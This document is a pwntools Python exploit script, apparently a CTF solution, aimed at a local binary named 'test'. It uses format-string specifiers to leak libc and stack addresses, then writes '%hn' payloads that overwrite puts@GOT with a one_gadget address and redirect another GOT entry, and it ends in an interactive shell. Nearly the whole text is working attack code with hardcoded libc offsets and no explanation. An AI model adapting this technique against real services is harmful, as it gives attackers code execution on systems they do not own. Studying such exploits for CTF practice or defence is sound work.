from pwn import*
p = process('./test')
t = 0.05
# got
puts_plt = 0x400520
puts_got = 0x601018
read_got = 0x601028
printf_plt = 0x400530

# libc leak
p.sendafter('>> ','%3$lx')
tmp = p.recv(12)
libc_base = int(tmp,16) - 0xf7260
libc_system = libc_base + 0x45390
log.info('libc_base  : {}'.format(hex(libc_base)))
log.info('libc_system: {}'.format(hex(libc_system)))

# stack leak
p.sendafter('>> ','%1$lx')
tmp = p.recv(12)
stack_addr = int(tmp,16)
log.info('stack_addr : {}'.format(hex(stack_addr)))

## FSB -> $6 : stack start
one = [0x45216,0x4526a,0xf02a4,0xf1147]
# stage 1 : puts_got -> one_gadget
one_gadget = libc_base+one[0]
for i in range(6):
	tmp = one_gadget%0x100
	pay =''
	pay += '%'+str(tmp)+'d'
	pay += '%11$hn'
	pay += 'a'*(0x28-len(pay))
	pay += p64(puts_got+i)
	p.send(pay);sleep(t)
	one_gadget/=0x100

# stage 2 : printf_plt -> puts_got
tmp = puts_plt
print(hex(tmp))
pay = ''
pay += '%'+str(tmp)+'d'
pay += '%11$ln'
pay += 'a'*(0x28-len(pay))
pay += p64(read_got)
raw_input()
p.sendafter('>> ',pay)

p.interactive()
